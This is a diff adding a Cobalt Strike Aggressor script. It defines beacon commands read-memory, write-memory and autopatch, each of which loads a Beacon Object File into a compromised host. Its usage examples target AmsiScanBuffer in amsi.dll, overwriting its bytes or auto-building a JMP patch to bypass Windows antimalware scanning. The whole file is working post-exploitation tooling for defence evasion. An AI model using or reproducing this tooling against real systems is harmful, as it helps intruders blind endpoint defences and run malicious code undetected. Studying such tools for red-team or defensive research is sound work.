@@ -1,0 +1,88 @@
+alias read-memory {
+        local('$handle $data $args $command');
+
+        # @_ holds args
+        if (size(@_) != 5) {
+                berror($1, "usage: read-memory dllName functionName startIndex numOfBytesToRead . Ex--> read-memory amsi AmsiScanBuffer 0 8");
+                return;
+        }
+
+        # Parse our args
+        $dllName = $2;
+        $functionName = $3;
+        $startIndex = $4;
+        $numOfBytes = $5;
+
+        # Open the object file, and read it in.
+        $handle = openf(script_resource("read/read-memory.o"));
+        $data   = readb($handle, -1);
+        closef($handle)
+
+        # pack our arguments
+        $args = bof_pack($1, "zzii", $dllName, $functionName, $startIndex, $numOfBytes);
+
+        # announce to user
+        btask($1, "reading memory at  $2:$3 starting index $4 and reading $5 bytes");
+
+        # Run a BOF
+        beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias write-memory {
+        local('$handle $data $args $command');
+
+        # @_ holds args
+        if (size(@_) != 5) {
+                berror($1, "usage: write-memory dllName functionName startIndex bytesToWrite . Ex--> write-memory amsi AmsiScanBuffer 0 FFEE99AA9090");
+                return;
+        }
+
+        # Parse our args
+        $dllName = $2;
+        $functionName = $3;
+        $startIndex = $4;
+        $bytesToWrite = $5;
+
+        # Open the object file, and read it in.
+        $handle = openf(script_resource("write/write-memory.o"));
+        $data   = readb($handle, -1);
+        closef($handle)
+
+        # pack our arguments
+        $args = bof_pack($1, "zziz", $dllName, $functionName, $startIndex, $bytesToWrite);
+        
+        # announce to user
+        btask($1, "writing memory at  $2 : $3 starting index $4 and $5 bytes");
+
+        # Run a BOF
+        beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias autopatch {
+        local('$handle $data $args $command');
+
+        # @_ holds args
+        if (size(@_) != 4) {
+                berror($1, "usage: autopatch dllName functionName bytesToReadAndFindC3 . Ex--> autopatch amsi AmsiScanBuffer 800");
+                return;
+        }
+
+        # Parse our args
+        $dllName = $2;
+        $functionName = $3;
+        $bytesToRead = $4;
+
+        # Open the object file, and read it in.
+        $handle = openf(script_resource("auto/autopatch.o"));
+        $data   = readb($handle, -1);
+        closef($handle)
+
+        # pack our arguments
+        $args = bof_pack($1, "zzi", $dllName, $functionName, $bytesToRead );
+
+        # announce to user
+        btask($1, "Auto Creating JMP patch within $4 bytes of $2:$3 ");
+
+        # Run a BOF
+        beacon_inline_execute($1, $data, "go", $args);
+}
